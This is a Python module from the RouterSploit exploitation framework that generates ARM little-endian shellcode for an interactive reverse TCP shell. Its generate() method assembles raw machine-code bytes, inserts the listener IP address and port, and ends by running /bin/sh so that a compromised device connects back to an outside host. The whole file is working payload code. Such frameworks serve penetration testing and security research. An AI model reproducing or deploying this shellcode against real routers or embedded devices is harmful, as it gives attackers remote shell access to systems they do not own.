from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "ARMLE Reverse TCP",
        "description": "Creates interactive tcp reverse shell for ARMLE architecture.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.ARMLE

    def generate(self):
        reverse_ip = utils.convert_ip(self.lhost)
        reverse_port = utils.convert_port(self.lport)

        return (
            b"\x01\x10\x8F\xE2" +
            b"\x11\xFF\x2F\xE1" +
            b"\x02\x20\x01\x21" +
            b"\x92\x1A\x0F\x02" +
            b"\x19\x37\x01\xDF" +
            b"\x06\x1C\x08\xA1" +
            b"\x10\x22\x02\x37" +
            b"\x01\xDF\x3F\x27" +
            b"\x02\x21\x30\x1c" +
            b"\x01\xdf\x01\x39" +
            b"\xFB\xD5\x05\xA0" +
            b"\x92\x1a\x05\xb4" +
            b"\x69\x46\x0b\x27" +
            b"\x01\xDF\xC0\x46" +
            b"\x02\x00" + reverse_port +  # "\x12\x34" struct sockaddr and port
            reverse_ip +                 # reverse ip address
            b"\x2f\x62\x69\x6e" +         # /bin
            b"\x2f\x73\x68\x00"           # /sh\0
        )
